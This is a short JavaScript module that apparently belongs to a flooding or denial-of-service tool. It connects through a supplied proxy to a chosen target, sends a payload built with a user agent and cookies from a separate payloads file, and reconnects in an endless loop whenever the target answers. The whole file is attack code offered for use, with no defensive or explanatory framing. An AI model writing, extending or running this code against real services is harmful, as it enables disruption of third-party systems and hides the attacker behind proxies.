async function trysocket(args, host, port, payload){
    let proxy = require('socket.io-proxy');

    proxy.init('http://' + host + ":" + port);
    let socket = proxy.connect(args.target);

    socket.on('connect', function () {
        socket.write(payload);
        socket.on('data', function (data) {
            socket.destroy();
            return trysocket(args, host, port, payload);
        });
        socket.on('disconnect', function() {
        });
    });
}

function start(args, proxy, ua, secondcookies){
    trysocket(args, proxy.split(":")[0], proxy.split(":")[1], require('./payloads/socket.js')(args, proxy, ua, secondcookies))
}

module.exports = start;